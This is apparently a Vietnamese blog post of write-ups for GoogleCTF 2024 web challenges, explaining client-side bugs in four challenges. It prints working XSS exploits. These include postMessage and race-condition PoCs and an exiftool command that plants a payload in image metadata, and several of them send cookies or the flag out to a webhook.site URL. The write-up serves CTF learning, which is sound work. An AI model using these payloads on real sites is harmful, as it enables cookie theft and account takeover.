---
title: "GoogleCTF 2024"
description: "GoogleCTF writeups"
summary: "Here is the GoogleCTF writeups"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2024-06-25
draft: false
authors:
  - Shin24
---

Cuối tuần vừa rồi, mình có chơi CTF với CoSGang a.k.a The Council of Sheep và đạt được thứ hạng **#28**

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/6d5221d6-763b-424a-892c-636727557efe)

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7627fe64-f9e1-4d77-ba65-9bae8ce38e52)

Đây sẽ là writeup của mình về những bài đã giải được (3 bài đầu) và cả những bài mình ngồi giải lại sau giải (2 bài sau), hi vọng nó sẽ giúp ích cho các bạn.

## SAPPY

Ở bài này ta thấy tính năng của web là khi ta click vào 1 trong 4 nút bấm thì sẽ có 1 iframe xuất hiện để hiển thị output tương ứng với từng nút

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/ce790035-de14-4171-a8eb-cb77927bd86c)

Trong file `sap.html` thì nội dung quan trọng sẽ ở trong đoạn sau:

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/558d5711-afd5-4b30-9d47-d7ea535b3fb3)

Trong file `sap.js` sẽ có một message handler

```js
window.addEventListener(
  "message",
  async (event) => {
    let data = event.data;
    if (typeof data !== "string") return;
    data = JSON.parse(data);
    const method = data.method;
    switch (method) {
      case "initialize": {
        if (!data.host) return;
        API.host = data.host;
        break;
      }
      case "render": {
        if (typeof data.page !== "string") return;
        const url = buildUrl({
          host: API.host,
          page: data.page,
        });
        const resp = await fetch(url);
        if (resp.status !== 200) {
          console.error("something went wrong");
          return;
        }
        const json = await resp.json();
        if (typeof json.html === "string") {
          output.innerHTML = json.html;
        }
        break;
      }
    }
  },
  false
);
```

Rất nhanh chóng ta xác định được một sink quen thuộc đó là `innerHTML`:

```js
output.innerHTML = json.html;
```

để chạm được nhánh `case` này ta sẽ cần postMessage một đoạn JSON với thuộc tính `method` là `render`, trước đó ta cũng cần control được `API.host` (thông qua method `initialize`) để làm web fetch payload của ta về và gán cho `innerHTML`. 

Trước đó thì ta sẽ cần bypass được `validate` được gọi khi ta cố gắng trigger `render` nhằm kiểm tra xem domain có phải là `sappy-web.2024.ctfcompetition.com` không

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/72d63809-59f6-4a67-ae36-692b69060efd)

Ta thấy được rằng trước khi gọi `validate` thì url sẽ được parse bằng `goog.Uri.parse`, ta cần hiểu cách mà hàm này hoạt động

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/20447bdd-d404-4783-b23e-93fe103aa90c)

Vào phần source của devtools để kiểm tra, ta tìm được phần khai báo constructor của object Uri

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/8f00a3c7-f5cd-4dc9-8cd6-49abc09eb668)

`goog.uri.utils.split` được gọi với tham số là `a` (`a` là url truyền vào ban đầu), ta thử xem cách `goog.uri.utils.split` hoạt động

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/1de272e3-8c9f-4ec3-b828-cc388498077e)

```
goog.uri.utils.splitRe_ = RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");
```

Vậy là url được xử lý dựa trên regex, rất nhanh ta sẽ thấy được vấn đề là phần protocol của URL không có ràng buộc phải là `http` hay `https`, ngay từ đầu việc parse URL bằng một đoạn regex thế này theo mình nghĩ đã là vấn đề, lấy ví dụ `https://google.com` thì hostname của nó là google.com, thế còn `file:///etc/passwd` thì hostname của nó là gì? Tới đây thì mình chợt nghĩ nếu như ta fetch đến `data:://sappy-web.2024.ctfcompetition.com` thì sẽ thế nào, vì cú pháp của một URL với protocol là `data://` sẽ là `data:[<mediatype>][;base64],<data>`, vậy ta có thể biến phần domain `sappy-web.2024.ctfcompetition.com` thành `mediatype` và khi fetch đến nó sẽ trả về response là `<data>`, đây là vấn đề parser inconsistency giữa `goog.URI` và browser

```html
<html>
    <iframe></iframe>
    <script>
        const ifrm = document.querySelector("iframe");

        ifrm.src="https://sappy-web.2024.ctfcompetition.com/sap.html"
        ifrm.addEventListener("load", function() {
            ifrm.contentWindow.postMessage(
                JSON.stringify({
                    "method": "initialize", 
                    "host": "data://sappy-web.2024.ctfcompetition.com/"
                }), "https://sappy-web.2024.ctfcompetition.com"
            );

            ifrm.contentWindow.postMessage(
                JSON.stringify({
                    "method": "render",
                    "page": ',{"html":"<img src=x onerror=\\"a = window.open(`https://sappy-web.2024.ctfcompetition.com/`); window.location=`https://webhook.site/cec28ede-90d8-41a4-9ef6-4f811d83e750/?c=${a.document.cookie}`\\" />"}'
                }), "https://sappy-web.2024.ctfcompetition.com"
            );
        })

    </script>
</html>
```

Đầu tiên ta sẽ thực hiện iframe và `postMessage` đến `sap.html` sau đó set `API.host` về `data://sappy-web.2024.ctfcompetition.com/`, rồi sau đó ở `page` trong đoạn JSON ở postMessage thứ 2 ta sẽ để payload XSS vào đó, khi gọi `fetch` lên URL này thì response trả về sẽ là đoạn JSON mà ta cài vào

## GRAND PRIX HEAVEN

Bài này thì có dính server side một chút nhưng concept cũng là client side

### TL;DR
Lợi dụng cách parse multipart/form-data của server để smuggle một field `mediaparser` vào, `mediaparser` tồn tại một sink XSS là innerHTML, ta sẽ lợi dụng một lỗi trong câu regex để bắt nó load đến media có chứa XSS payload trong exifdata và lấy flag trong cookie của bot

### Writeup

Challenge gồm 2 server với heaven_server có nhiệm vụ như một proxy thực hiện các tiền xử lý trước khi forward đến `template_server` để render nên page bằng các template có sẵn

Đầu tiên thì ta sẽ thấy sink XSS trong file `mediaparser.js`, nhưng không như `apiparser.js` thì `heaven_server` sẽ không có phép ta load `mediaparser.js` vào và cũng như bắt buộc ta phải include CSP vào trước khi tạo faves

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/83b9cd21-c5b5-4d0c-b472-42f9b4828a4e)

Ở phần CSP thì khá dễ bypass, thay vì array thì ta sẽ gửi một object với các key là các số theo dạng `{"1":"aaaa", ...}` để né index 0, để include được `mediaparser.js` thì ta sẽ nhìn vào cách mà template_server parse multipart/form-data

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/1ff4cd06-6603-4190-bf41-0f655bf7da49)

Ta thấy server dùng `\r\n\r\n` làm delimiter để split data thành một mảng và check xem mảng đó có template key (như csp, faves, retrieve, mediaparser, ...) không, nếu có thì nó sẽ include phần HTML tương ứng của template key đó vào response

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/cb30161e-5ed8-45ee-bba8-1510c79891ca)

Vậy nếu trong key mà ta gửi lên server có dạng `6\r\n\r\nmediaparser\r\n\r\n` thì sao? Lúc này ở heaven_server nó sẽ đi qua `parseInt` và trả về giá trị 6, hợp lệ, khi đến server thì được split ra thành một mảng với delim là "\r\n\r\n", lúc này array sẽ có một phần tử là `mediaparser` vì nó nằm giữa 2 delim, lúc này đoạn `lines.includes(item)` sẽ đúng và nó sẽ include `mediaparser` vào. Xong 1 phase, ở phase 2 ta sẽ tìm cách để làm cho nó load một cái media ta vừa tạo

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/f36a166a-d968-47a7-b1fe-c765fe47fea2)

Vấn đề ta gặp phải là constructor của `Requester` sẽ chặn một vài ký tự trong URL dẫn đến ta không thể truyền full URL vào được (ta cần fetch đến route `/media/:mediaId` chứ không phải `/api/get-car/:carId`), tuy nhiên thì phần check dùng regex

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7856dfc8-d856-496d-a349-20493cc62c8b)

Bạn có thấy điều bất thường ở đây không? Ta không thể đưa `\s` vào trong cặp dấu `[...]` được, lúc này nó sẽ hiểu là ký tự `\` và `s` chứ không phải space, vậy nghĩa là ta sẽ có thể dùng dấu `\` nữa, khi test thì mình nhận ra nếu ta gọi `new URL("\\", 'http://localhost:1337/api/get-car/');` thì lúc này URL sẽ thành `http://localhost:1337/`, nghĩa là base path đã bị override thành công, lúc này ta có thể truyền `\\media\\<media_id>` để mediaparser fetch đến media ta chuẩn bị sẵn, trước đó thì ta sẽ cài payload vào file jpg bằng exiftool

```
exiftool -ImageDescription='<img src=x onerror="window.location=`https://webhook.site/cec28ede-90d8-41a4-9ef6-4f811d83e750/?c=${document.cookie}`" />' Sample-jpg-image-50kb.jpg
```

Tạo fave:

```
POST /api/new-car HTTP/2
Host: grandprixheaven-web.2024.ctfcompetition.com
Content-Length: 52177
Cache-Control: max-age=0
Origin: http://localhost:1337
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIxVOFGMKmjxYaR62
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:1337/new-fave
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

------WebKitFormBoundaryIxVOFGMKmjxYaR62
Content-Disposition: form-data; name="year"

2004
------WebKitFormBoundaryIxVOFGMKmjxYaR62
Content-Disposition: form-data; name="make"

Ferrari
------WebKitFormBoundaryIxVOFGMKmjxYaR62
Content-Disposition: form-data; name="model"

F2004
------WebKitFormBoundaryIxVOFGMKmjxYaR62
Content-Disposition: form-data; name="custom"

{
    "1": "retrieve",
    "2": "head_end",
    "3": "head_end",
    "4": "faves",
    "5": "footer",
		"6\r\n\r\nmediaparser\r\n\r\n": "apiparser"
}
------WebKitFormBoundaryIxVOFGMKmjxYaR62
Content-Disposition: form-data; name="image"; filename="Sample-jpg-image-50kb.jpg"
Content-Type: image/jpeg

...
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/ee0a2dc5-d7d6-4f13-aa4d-495265eb4f69)

Dùng endpoint get-car để lấy id của media vừa upload

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/2f7deef7-1582-4e7a-b338-69324866f87c)

```
https://grandprixheaven-web.2024.ctfcompetition.com/fave/yn7TOo04qgNcr4n9TivPh?F1=\media\Q65ajKjHXfTm1MN0OS-yI
```

Report:

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/fe1563a5-77e1-47bc-badb-643d971ac795)

## POSTVIEWER V3

Thật ra mình cũng không làm client side nhiều lắm, nhưng nói chung là mình cũng khá thích nó, bài này làm mình cũng hơi mất thời gian khi đi hết từ ý tưởng này đến ý tưởng khác + với việc method mình dùng là race condition nên phải ngồi spam bot cả tiếng nó mới hit...

Mình sẽ nói sơ ra về bài này một chút (mình sẽ cố gắng nói sơ về context ở mỗi bài nhưng hi vọng là các bạn đã có bung đề ra và xem trước rồi, mình muốn tập trung vào phân solving hơn là mấy cái râu ria). Đầu tiên thì đây là một "client-side file upload", web sẽ lưu file vào indexedDB, khi mở file thì nội dung file sẽ được render trong một "sandboxed origin" (`https://sbx-<hash>.postviewer3-web.2024.ctfcompetition.com`) thông qua iframe, bên trong iframe đó thì sẽ tiếp tục render nội dung của file thông qua một iframe trỏ đến blob URL

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/9fcd8db2-f5c8-488c-b282-9f905e7690a7)

Goal của ta đó là con bot sẽ add một file chứa flag vào, ta cần lấy được nội dung của file đó somehow... Mình đã có đi qua nhiều ý tưởng nhưng chỉ có một idea là work nên mình sẽ trình bày về idea đó.

### safeFrameRender

Đầu tiên thì ta sẽ có một bug XSS rõ ràng trong sbx origin, thật ra đây là tính năng của web để giúp cho sbx origin có thể load nội dung tùy ý (nhằm sandbox nội dung tùy ý). Tuy nhiên XSS trên origin này thì gần như không có impact gì vì cookie nằm ở origin `https://postviewer3-web.2024.ctfcompetition.com`, ta cùng đi qua cách mà web sandbox file's content. `previewFile` sẽ được trigger, sau đó `previewFile` sẽ tiếp tục gọi `safeFrameRender`, `safeFrameRender` sẽ hoạt động như sau:
- Gọi `calculateHash` để tính ra hmac để bảo đảm với một content A sẽ chỉ khớp với 1 content A'
- Sau đó thực hiện tạo iframe tới file `shim.html` của origin vừa tạo 
- postMessage để gửi nội dung của sbx đi sau khi bên sbx origin callback về (nghĩa là khi sbx đã load xong)

Sau khi xong stage này thì nội dung của sbx origin sẽ là nội dung của `evaluatorHtml`

```html
<html>
  <head>
    <meta charset="utf-8">
    <title>Evaluator</title>

    <script>
      onmessage = e => {
        if(e.source !== parent) {
          throw /not parent/;
        };
        if(e.data.eval){
          eval(e.data.eval);
        }
      }
      onload = () => {
        parent.postMessage('loader ready','*');
      }
    </script>

    <style>
      body{
        padding: 0px;
        margin: 0px;
      }
      iframe{
        width: 100vw;
        height: 100vh;
        border: 0;
      }
      .spinner {
        background: url(https://storage.googleapis.com/gctf-postviewer/spinner.svg) center no-repeat;
      }
      .spinner iframe{
        opacity: 0.2
      }
    </style>
  </head>
  <body>
    <div id="container" class="spinner"></div>
  </body>
</html>
```

Lúc này chức năng của `shim.html` sẽ là nhận postMessage từ parent và eval data được gửi đến, bước này phục vụ cho việc parent sẽ gửi đến đoạn js lưu trong `iframeInserterHtml` để thực hiện đưa file's content vào bên trong iframe thông qua blob URL

```js
const container = document.querySelector("#container");
container.textContent = '';
const iframe = document.createElement('iframe');
iframe.src = URL.createObjectURL(new Blob([e.data.body], {type: e.data.type}));
if(e.data.sandbox) {
  iframe.sandbox = e.data.sandbox;
}
container.appendChild(iframe);
setTimeout(()=>{
  container.classList.remove('spinner');
}, 5000);
iframe.onload = () => {
  setTimeout(()=>{
    container.classList.remove('spinner');
  }, 500);
};
```

Tới đây thì mình nghĩ, sẽ ra sao nếu mình dùng `const win = window.open("https://postviewer3-web.2024.ctfcompetition.com/#0")` để mở trang challenge với hash là `#0` để trigger mở file flag, sau đó `win.frames[0].postMessage(...)` để gửi postMessage đến sbx origin bên trong? Chắc chắn là fail, vì đoạn check `e.source !== parent`. Một lúc sau mình nảy ra thêm một ý khác, sẽ ra sao nếu ta có thể XSS được sbx origin, từ đó thực hiện `win = window.open("https://postviewer3-web.2024.ctfcompetition.com/#0")` và `win.frames[0].eval(...)` để XSS luôn iframe bên trong của challenge? Nếu thế thì ta cần thỏa mãn 1 điều kiện:
- Sbx origin mà ta XSS phải có cùng origin với sbx origin mà challenge mở (nghĩa là bọn nó phải cùng hash với nhau)

Tới đây mình nghĩ rằng có lẽ ta sẽ cần leak được origin của flag, nhưng không có manh mối gì cả... vậy thì control origin của flag luôn thì sao? 

### Race condition

Nhìn vào `safeFrameRender`:

```js
const hash = await calculateHash(body, product, window.origin, location.href);
```

Ở stage này thì body sẽ là `evaluatorHtml`, product là `postviewer`, window.origin là `https://postviewer3-web.2024.ctfcompetition.com`, chỉ có `location.href` là không biết được do phần hash của chứa file id của flag thì ta không biết, vì nếu trigger bằng hash `#0` thì tí nữa hash cũng sẽ bị replace thành file id của flag

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/99c29bb3-2372-4e3a-9fd2-f66f6966c49b)

Vậy thì sẽ ra sao nếu `location.hash` bị đổi sau khi `location.hash` bị reassign và trước khi được đưa vào hàm `calculateHash`? Lúc này thì ta sẽ control được cả 4 factor tạo nên sha256 hash nên ta sẽ biết được sbx origin được sử dụng để send flag đến. Vậy biết được origin rồi thì sao nữa nhỉ... tại đây ta có thể dựa trên bug XSS ở sbx origin ban đầu, lợi dụng nó để XSS sbx origin của iframe trong challenge

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/0d26161e-a3da-445f-a1e3-d70062ba7d1b)

Vấn đề là làm sao để sbx origin mà ta XSS có cùng origin (cùng hash) với origin bên trong server được? Vì nếu muốn XSS được sbx origin thì body của ta sẽ khác với body mà sbx origin của challenge dùng chứ đúng không? Đến đây thì mình nghĩ maybe là có hash collision chăng? Nhưng mà sha256 thì collison thế quái nào được nhỉ... Sau một tí thời gian thì mình nhận ra là nó đơn giản hơn thế nhiều, ta chỉ cần dùng lại body trong `evaluatorHtml` là được, lúc này body sẽ trùng với body mà challenge sử dụng, và trên hết là lúc này ta sẽ pass được phần check `e.source !== parent` vì theo sơ đồ bên trên `exploit.html` chắc chắn sẽ là parent của sbx origin này.

Còn một điều nữa đó là `TRUSTED_ORIGIN` vẫn chưa giống với `TRUSTED_ORIGIN` của challenge, ở challenge thì argument thứ 3 sẽ là `https://postviewer3-web.2024.ctfcompetition.com` (window.origin), còn đối với sbx origin mà ta chuẩn bị XSS, ta sẽ phải để `TRUSTED_ORIGIN` là origin mà ta dùng để host `exploit.html` (ngrok maybe) 

Cách giải quyết cũng không khó lắm, vì control được hash của challenge thông qua race condition, ta có thể append `TRUSTED_ORIGIN` của ta (ngrok) vào hash đó, sau đó trong phần body mà ta chuẩn bị postMessage qua cho origin sbx ta sẽ thêm `postviewerhttps://postviewer3-web.2024.ctfcompetition.comhttps://postviewer3-web.2024.ctfcompetition.com/#` vào để nó khớp với server, nhằm generate ra 2 hash giống nhau

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/6e004d74-dfda-4939-9f82-20bb20ff5e62)

```js
const prepend_chunk = evaluatorHtml + "postviewer" + "https://postviewer3-web.2024.ctfcompetition.com" + "https://postviewer3-web.2024.ctfcompetition.com/#" 
```

### Double race condition

Tiếp đến thì khi race condition trigger hash change vào đúng race window, ta sẽ có window bị XSS và iframe bên trong của challenge có origin giống nhau, do đó từ window bị XSS ta có thể thực hiện `win.frames[0].eval(...)`. Vấn đề là ở iframe này thì origin của nó khác với blob iframe bên trong, bởi blob URL sẽ có origin là null, và origin là null thì sẽ luôn luôn fail SOP (đúng vậy, 2 null origin cũng sẽ được xem là khác origin). Ở đây ta sẽ thực hiện set `win.frames[0].onmessage = ...` để setup một message handler mới trước khi bên challenge thực hiện postMessage với nội dung flag qua nhằm gửi flag về webhook (vì body gửi qua là một ArrayBuffer nên ta cũng sẽ cần convert nó qua string trước khi fetch flag về nữa).

### StrictOriginIsolation

Ta thấy chrome của bot enable một feature flag 

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/08d4bfff-0979-41eb-a0f0-098c63f7e22d)

> Strict Origin Isolation would improve security by ensuring different origins do not share a process with each other, but it poses a risk of increased resource usage

> When enabled, Chrome opens up a dedicated process for each website you access and creates a strict wall between them that keeps them separate. This creates a dedicated sandbox for each website where neither they can access information of other websites nor their information could be accessed by other websites.

Ngắn gọn là mỗi website ta access sẽ được render trong một process riêng biệt, đây là một mitigation đối với meltdown attack, mitigation sẽ đi với các drawback nhất định và ở trường hợp này là CPU usage và thời gian xử lý, các tác vụ sẽ cần thời gian lâu hơn để thực và do đó, so với khi không enable feature này thì khi thực hiện race ta sẽ cần nới lỏng thời gian sleep đi, và nếu ta để ý thì

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/5a75e7d7-a53b-4362-8f5c-eb402ed30cd5)

Có một lệnh `sleep` tưởng như vô nghĩa được chèn vào giữa đoạn xử lý hash, thật ra thì một lệnh này là đã đủ và có lẽ là không cần ta phải thêm một lệnh sleep nào khác trong exploit nữa, có lẽ là intended của tác giả để làm race dễ dính hơn. 

### Exploit

```html
<html>
    <iframe></iframe>
    <script src="a.js"></script>
    <script>
        const the_hash = `postviewerhttps://75a7-203-167-11-246.ngrok-free.app`;
        // const the_hash = `file-ff582564efb8cb8229f1db607c35ae35c4b59e27`;
        const payload = `

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        async function race(win) {
            while (true) {
                try {
                    await sleep(800);
                    win.location.replace("https://postviewer3-web.2024.ctfcompetition.com/#0")
                    win.location.replace("https://postviewer3-web.2024.ctfcompetition.com/#${the_hash}")
                    await sleep(0);
                    // console.log(win.frames[0].location.href)
                    win.frames[0].window.onmessage = (e) => {
                        // location.href = "https://webhook.site/cec28ede-90d8-41a4-9ef6-4f811d83e750/?c="+123
                        var enc = new TextDecoder("utf-8");
                        location.href = "https://webhook.site/cec28ede-90d8-41a4-9ef6-4f811d83e750/?c="+enc.decode(e.data.body)
                    }
                } catch (e) {}
            }
        }

        for (let i = 0; i < 100; i++) {
            race(open("https://postviewer3-web.2024.ctfcompetition.com/"));
        }
        
        `

        const ifrm = document.querySelector("iframe");
        
        const prepend_chunk = evaluatorHtml + "postviewer" + "https://postviewer3-web.2024.ctfcompetition.com" + "https://postviewer3-web.2024.ctfcompetition.com/#" 
        ifrm.src="https://sbx-1npy2a9m4fd8g0r5jeg1qwkarykrt1gnvdxxhh5ia0nxk8nvrb.postviewer3-web.2024.ctfcompetition.com/postviewer/shim.html?o=https://75a7-203-167-11-246.ngrok-free.app"
        ifrm.addEventListener("load", function() {
            ifrm.contentWindow.postMessage(
                {
                    "body": prepend_chunk,
                    "mimeType": "text/html",
                    "salt": ""
                }, "*"
            );

            setTimeout(() => {
                ifrm.contentWindow.postMessage(
                    {
                        "eval":payload,
                        "body": "aaa",
                        "mimeType": "text/html",
                        "salt": ""
                    }, "*"
                );
            }, 1000)
        })

    </script>

    <!-- <script>
        const win = window.open("https://postviewer3-web.2024.ctfcompetition.com/#1", "_blank");

    </script> -->
</html>
```

a.js:

```js
const evaluatorHtml = `
<html>
  <head>
    <meta charset="utf-8">
    <title>Evaluator</title>

    <script>
      onmessage = e => {
        if(e.source !== parent) {
          throw /not parent/;
        };
        if(e.data.eval){
          eval(e.data.eval);
        }
      }
      onload = () => {
        parent.postMessage('loader ready','*');
      }
    </script>

    <style>
      body{
        padding: 0px;
        margin: 0px;
      }
      iframe{
        width: 100vw;
        height: 100vh;
        border: 0;
      }
      .spinner {
        background: url(https://storage.googleapis.com/gctf-postviewer/spinner.svg) center no-repeat;
      }
      .spinner iframe{
        opacity: 0.2
      }
    </style>
  </head>
  <body>
    <div id="container" class="spinner"></div>
  </body>
</html>
`;
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/e0b3c7f1-e26b-4945-bff9-df28a1ff4cb5)

## GAME ARCADE

Bài này gần giống bài postviewerv3 về cơ chế sandbox, một trong những điểm khác biệt đáng lưu ý đó là browser mà bài này sử dụng là firefox. 

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/17687953-ecef-4445-8141-a20924f9944d)

Vậy thì có thể đây là một behavior này đó đặc biệt của firefox chăng? Đầu tiên thì cứ ngồi analyze xem bài này có gì. Cơ chế tạo hash cho sbx origin của bài khá giống với postviewerv3, khác là các factor được dùng để tạo hash giờ đây được ngăn cách bằng delimiter là `$@#|`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/8c52882f-28de-4aa1-b414-9f072c5c6e65)

Mỗi khi ta chọn một game, một sbx origin cũng sẽ được tạo ra để render và sandbox HTML của game đó lại, đáng lưu ý thì có một game là password guessing, cũng là game duy nhất mà con bot có tương tác. Cụ thể thì con bot sẽ nhả flag vào ô change password của game này, có vẻ ta sẽ phải tìm cách để leak flag trong game này. Hẳn bạn còn nhớ cơ chế giao tiếp giữa sbx origin và origin của challenge trong bài trước, đó chính là thông qua postMessage, ở bài này cũng vậy tuy nhiên thì ở bài này postMessage diễn ra thông qua một MessageChannel: https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel

### MessageChannel

Khi làm việc với MessageChannel thì ta sẽ có 2 `port`, ta sẽ nhận message bằng một port (tạm gọi port A) và gửi port còn lại (tạm gọi port B) cho đầu nhận, đầu nhận nếu cần reply lại message vừa rồi thì sẽ thực hiện postMessage thông qua port B, port A sẽ là nơi được đầu gửi setup message handler nhằm nhận message. Vạy thì tại sao bài này lại dùng MessageChannel? Cùng lấy 1 ví dụ

a.html:

```html
<script>
    const messageChannel = new MessageChannel();
    messageChannel.port1.onmessage = (e) => {
        console.log("recv from channel:")

        console.log(e.data)
    }

    window.onmessage = (e) => {
        console.log("recv from window.onmessage:")

        console.log(e.data)
    }

    const win = window.open("b.html");

    setTimeout(() => {
        win.postMessage("aaa", "*", [messageChannel.port2])
    }, 1000);
</script>
```

b.html:

```html
<script>
    window.onmessage = (e) => {
        console.log("message received, sending callback...")
        console.log(e)
        e.ports[0].postMessage("aaa")
    }
</script>
```

Ở đây thì sẽ chỉ có callback của `messageChannel.port1` là chạy, vậy thì nó sẽ giúp ích gì nhỉ? Đó là nếu như a.html đột nhiên bị redirect đến một origin khác trước khi `e.source.postMessage` của `b.html` kịp chạy, từ đó nơi mà data đến postMessage đến có thể là một trang do attacker dựng nên nhằm capture lại secret gì đó của user. TUY NHIÊN, giả thuyết này lại không đúng đối với google chrome, hãy xem ví dụ sau:

a.html:

```html
<script>
    const messageChannel = new MessageChannel();
    messageChannel.port1.onmessage = (e) => {
        console.log("recv from channel:")

        console.log(e.data)
    }

    window.onmessage = (e) => {
        console.log("recv from window.onmessage:")

        console.log(e.data)
    }

    const win = window.open("b.html");

    setTimeout(() => {
        win.postMessage("aaa", "*", [messageChannel.port2]);
        window.location = "c.html"
    }, 1000);
</script>
```

b.html:

```html
<script>
    const sleep = d => new Promise(r => setTimeout(r, d));
    window.onmessage = async (e) => {
        console.log("message received, sending callback...")
        console.log(e)
        // e.ports[0].postMessage("aaa")
        await sleep(10000);
        e.source.postMessage("secret", "*")
    }
</script>
```

c.html:

```html
<script>
    window.onmessage = (e) => {
        console.log("secret captured: " + e.data)
    }
</script>
```

Khi chạy ở Google Chrome:

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/79a594af-90e5-4b91-8547-d6e7339bfbd7)

Có thể thấy rằng khi tab của a.html bị redirect, `e.source` ngay lập tức được gán `null`

Khi chạy ở Firefox:

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/304f4287-e82c-4033-a030-4bad85b7f383)

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/d3a62865-2c9d-4b66-a52b-e7e9115c5551)

Điều xảy ra ở Chrome đã không giống với điều xảy ra ở firefox, thú vị đấy... Giờ thì ta đã hiểu vai trò của MessageChannel rồi

### shim.html

Hãy cùng nhìn vào `shim.html` của sbx origin

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/2ce3afa9-9c65-4b7e-bd0a-eaefc499c5a8)

Cũng không hẳn là ta phải reverse đống này, ta chỉ cần chú ý vào cái message handler của nó thôi, đại khái là nó sẽ compare hash của data được postMessage đến và sau đó render nó bằng blob URL. 

### password game

Ta nhanh chóng tìm được nhiều sink `innerHTML` được sử dụng

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/92145f54-fc52-42b7-90f1-c8061226ce5d)

Trong đó có một nơi mà tainted data có thể flow từ source `document.cookie` (hoặc `localStorage`) đến sink `innerHTML`. Để có thể chèn được data vào Local Storage, ta sẽ cần XSS được sbx origin đó, nhìn lại cách mà game được sandbox thì thay vì bằng iframe như lần trước thì giờ đây nó là 1 window riêng biệt, ta sẽ không thể `win.frames[0].eval(...)` như lần trước được. Vậy thì làm sao đây? Ta vẫn còn `document.cookie`, và nếu như bạn đã quên thì ta có thể specify các thuộc tính cho cookie (như httponly, secure flag, ...), một trong số đó là thuộc tính `Domain`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/ff1b3759-cea8-41de-8c82-8a3709418335)

Một subdomain sẽ có thể share cookie với một domain hoặc subdomain khác (`A.example.com` có thể share cookie với `B.A.example.com`)

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/168f832f-b751-4d18-8576-6670f6fe4c89)

Để ý rằng tại `shim.html`, nếu ta dùng một origin có dạng `<hash1>-h641507400.0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog`, với `hash1` sẽ là hash của payload của ta thì ta sẽ có thể thỏa điều kiện của hash check nhưng vẫn có thể XSS subdomain của sbx origin và set cookie với domain là `0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog`. Như thế thì ta có thể lợi dụng XSS để set cookie `password=<XSS>` cho domain `0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog` và trigger XSS một lần nữa nhằm lấy flag từ `localStorage`. Tuy nhiên có một điều hơi cấn, `correctPasswordSpan` sẽ không được insert vào DOM cho đến khi password được guess đúng.

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/5e4eb247-fd9e-4478-8f93-85f8543ea42f)

Challenge này đã nhắc cho ta rằng element không cần thiết phải được insert vào DOM để có thể trigger XSS

### Firefox???

Tới đây ta sẽ có `exploit.html` như sau (original exploit from **@Terjang**)

```html
<body>
    <!-- Import crypto functions from the challenge. -->
    <script src="https://game-arcade-web.2024.ctfcompetition.com/static/safe-frame.js"></script>
  
    <script>
      const passwordGameHash = '0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog';
      const CHALL_URL = 'https://game-arcade-web.2024.ctfcompetition.com/#1';
      const sleep = d => new Promise(r => setTimeout(r, d));
      (async function () {
        const xss = escape(`xss<img src onerror="opener.opener.postMessage({flag:document.cookie}, '*')">`);
        // const xss = escape(`xss<img src onerror="alert(1)">`);
        const exploit = `<script>document.cookie="password=${xss};Domain=${passwordGameHash};Path=/";alert(123);<\/script>`;
        const hash = await calculateHash('google-ctf', new ArrayBuffer(0), origin);
  
        /**
         * There is a bug that allows to execute on the same site as the password game.
         * Set an XSS inside a cookie and leak admin's cookie.
        */
        const win = open(`http://${hash}-h641507400.${passwordGameHash}/google-ctf/shim.html?origin=${encodeURIComponent(origin)}&cache=1`);
        await sleep(1000);
  
        win.postMessage({ body: exploit, mimeType: 'text/html', salt: new ArrayBuffer(0) }, '*');
        
        // await sleep(3000);
        open(CHALL_URL);
        window.onmessage = e => {
